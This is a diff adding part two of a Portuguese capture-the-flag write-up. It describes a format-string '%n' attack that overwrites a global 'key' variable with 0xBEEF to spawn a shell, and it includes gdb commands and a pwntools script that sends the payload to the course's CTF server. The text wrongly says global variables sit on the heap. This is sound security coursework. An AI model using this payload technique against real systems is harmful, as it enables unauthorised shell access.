@@ -39,3 +39,29 @@ LOCAL = False
 E com isso chegamos então à flag e finalizamos assim a primeira parte:
 
 ![](images/CTF7_4.png)
+
+## Parte 2
+
+Começamos outra vez por analisar os ficheiros fornecidos e reparamos novamente que o Program continua sem randomização de endereço. Porém, reparamos diferenças no main.c que agora é lançada uma bash se o valor key for 0xBEEF, ou seja, 48879 em decimal. A partir daqui vamos poder chegar ao conteúdo do ficheiro flag.txt.
+
+Como a key é uma variável global está na Heap, e por isso vamos usar um format string attack do input através de '%n'. Para isso fomos buscar o valor de endereço da variável global key, seguindo novamente a dica do enunciado, com o gdb:
+
+```
+gdb ./program
+p &key
+```
+
+Está no endereço: "0x0804B324" que é "\x24\xB3\x04\x08" em hexadecimal. Como queremos escrever 48879 neste endereço tivemos de modificar a string dada como input: após o endereço pretendido (4 bytes) é necessário escrever exatamente 48879 - 4 = 48871 bytes antes de '%n'. Temos de ter em conta que o buffer de entrada só tem no máximo 32 bytes disponíveis, e por isso chegamos à expressão de leitura do printf %.Nx, com N = 48871.
+
+```
+p = remote("ctf-fsi.fe.up.pt", 4005)
+
+p.recvuntil(b"here...")
+p.sendline(b"AAAA\x24\xB3\x04\x08%.48871x%n")
+p.interactive()
+```
+
+![](images/CTF7_5.png)
+![](images/CTF7_6.png)
+
+E ao executar chegamos à nova flag.
